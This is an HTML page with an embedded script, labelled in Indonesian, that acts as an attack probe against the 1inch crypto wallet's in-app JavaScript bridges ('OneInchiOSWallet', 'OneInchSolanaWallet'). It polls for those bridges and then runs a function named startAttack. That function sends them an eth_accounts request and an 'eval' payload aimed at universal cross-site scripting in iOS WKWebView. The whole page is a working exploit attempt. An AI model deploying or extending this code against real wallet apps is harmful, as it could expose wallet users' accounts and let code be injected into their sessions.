<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1inch Bridge Persistent Scanner</title>
</head>
<body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
    <h3>🔍 Scanning for 1inch Bridge...</h3>
    <div id="status">Status: Mencari...</div>
    <hr>
    <div id="logs"></div>

    <script>
        const log = (m) => {
            const d = document.getElementById('logs');
            d.innerHTML = `> ${m}<br>` + d.innerHTML;
        };

        function startAttack(bridgeName) {
            const target = window[bridgeName];
            log(`<b style="color:yellow;">Ditemukan! Menyerang ${bridgeName}...</b>`);
            
            // Payload yang paling sering bocor di iOS WKWebView
            const payloads = [
                JSON.stringify({method: "eth_accounts", id: 1}),
                JSON.stringify({type: "eval", code: "alert('UXSS SUCCESS')"})
            ];

            payloads.forEach(p => {
                try {
                    target.call(p); 
                    log("Payload terkirim ke .call()");
                } catch(e) {
                    log("Gagal kirim: " + e.message);
                }
            });
        }

        // Fungsi deteksi berulang (Interval)
        const checkExist = setInterval(() => {
            const bridges = ["OneInchiOSWallet", "OneInchSolanaWallet"];
            
            bridges.forEach(b => {
                if (window[b]) {
                    document.getElementById('status').innerHTML = `Status: <b style="color:yellow;">${b} AKTIF!</b>`;
                    clearInterval(checkExist); // Hentikan scan jika sudah ketemu
                    startAttack(b);
                }
            });
        }, 500); // Cek setiap 0.5 detik
    </script>
</body>
</html>
